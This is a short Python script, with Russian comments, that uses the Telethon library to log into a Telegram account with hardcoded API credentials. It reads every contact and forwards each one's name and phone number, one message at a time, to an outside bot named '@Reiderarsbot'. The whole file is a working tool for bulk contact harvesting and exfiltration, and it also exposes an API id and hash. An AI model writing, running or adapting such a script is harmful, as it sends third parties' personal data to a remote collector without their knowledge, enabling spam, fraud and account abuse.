import asyncio
from telethon import TelegramClient
from telethon.tl.functions.contacts import GetContactsRequest

# Введите ваши данные
api_id = '22033302'
api_hash = '522596c0b5c29485d238e531ed87ec83'
bot_username = '@Reiderarsbot'  # Например, 'my_bot'

# Авторизация
client = TelegramClient('session_name', api_id, api_hash)

async def main():
    await client.start()

    # Получаем контакты
    result = await client(GetContactsRequest(hash=0))  # Передаем hash=0
    contacts = result.users  # Контакты возвращаются в users

    # Пересылаем каждый контакт в бота
    for contact in contacts:
        if contact.phone:  # Проверяем, есть ли номер телефона
            # Формируем сообщение
            message = f"Имя: {contact.first_name}, Фамилия: {contact.last_name}, Номер: {contact.phone}"
            await client.send_message(bot_username, message)
            print(f"Отправлено: {message}")
            await asyncio.sleep(1)  # Задержка 1 секунда (можно увеличить для уменьшения нагрузки)

with client:
    client.loop.run_until_complete(main())
